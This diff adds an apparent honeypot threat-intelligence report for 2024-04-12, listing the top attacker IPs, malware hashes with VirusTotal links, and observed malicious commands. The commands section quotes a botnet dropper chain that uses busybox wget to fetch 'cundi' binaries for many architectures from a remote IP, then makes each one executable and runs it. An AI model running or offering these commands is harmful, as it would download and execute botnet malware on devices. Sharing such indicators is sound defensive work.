@@ -1,0 +1,34 @@
+Top 5 IPs for 2024-04-12 :
+
+175.173.224.26
+43.156.3.145
+124.225.88.167
+122.96.31.137
+203.99.187.137
+
+Malware Download:
+
+340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+https://www.virustotal.com/gui/file/340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+def8a9c6142d7a5a0f4b02273b5a780da95d7717c8168021ac81b6f14d8e528e
+https://www.virustotal.com/gui/file/def8a9c6142d7a5a0f4b02273b5a780da95d7717c8168021ac81b6f14d8e528e
+05d38eebbe92015c35861eaf892b14006d45befff6917f21b9ae588a3f21bf4a
+https://www.virustotal.com/gui/file/05d38eebbe92015c35861eaf892b14006d45befff6917f21b9ae588a3f21bf4a
+20d59c5a44207c7511158f37640f95061640ec16ac33cbc351b0b82426a29d5a
+https://www.virustotal.com/gui/file/20d59c5a44207c7511158f37640f95061640ec16ac33cbc351b0b82426a29d5a
+2cc3a7bbfb287370350b494d3cf97bcf7ca212c88e62f456d235b046836c40a3
+https://www.virustotal.com/gui/file/2cc3a7bbfb287370350b494d3cf97bcf7ca212c88e62f456d235b046836c40a3
+b7df8b3e5b72fb74566d3568e13f5852ab29ff379a9d2a0983d80fab4c59e52d
+https://www.virustotal.com/gui/file/b7df8b3e5b72fb74566d3568e13f5852ab29ff379a9d2a0983d80fab4c59e52d
+c5c24a19759ea0257f1b8bbfde9a3e73bb4960618e0de4dc988ee2f3b505a8f1
+https://www.virustotal.com/gui/file/c5c24a19759ea0257f1b8bbfde9a3e73bb4960618e0de4dc988ee2f3b505a8f1
+
+Malcious Commands seen:
+
+busybox wget http://14.225.219.227/cundi.arm5; chmod 777 cundi.arm5; ./cundi.arm5 android\r\nbusybox wget http://14.225.219.227/cundi.arm; chmod 777 cundi.arm; ./cundi.arm android\r\nbusybox wget http://14.225.219.227/cundi.arm6; chmod 777 cundi.arm6; ./cundi.arm6 android\r\nbusybox wget http://14.225.219.227/cundi.arm7; chmod 777 cundi.arm7; ./cundi.arm7 android\r\nbusybox wget http://14.225.219.227/cundi.m68k; chmod 777 cundi.m68k; ./cundi.m68k android\r\nbusybox wget http://14.225.219.227/cundi.mips; chmod 777 cundi.mips; ./cundi.mips android\r\nbusybox wget http://14.225.219.227/cundi.mpsl; chmod 777 cundi.mpsl; ./cundi.mpsl android\r\nbusybox wget http://14.225.219.227/cundi.ppc; chmod 777 cundi.ppc; ./cundi.ppc android\r\nbusybox wget http://14.225.219.227/cundi.sh4; chmod 777 cundi.sh4; ./cundi.sh4 android\r\nbusybox wget http://14.225.219.227/cundi.x86; chmod 777 cundi.x86; ./cundi.x86 android\r\nbusybox wget http://14.225.219.227/cundi.x86_64; chmod 777 cundi.x86_64; ./cundi.x86_64 android
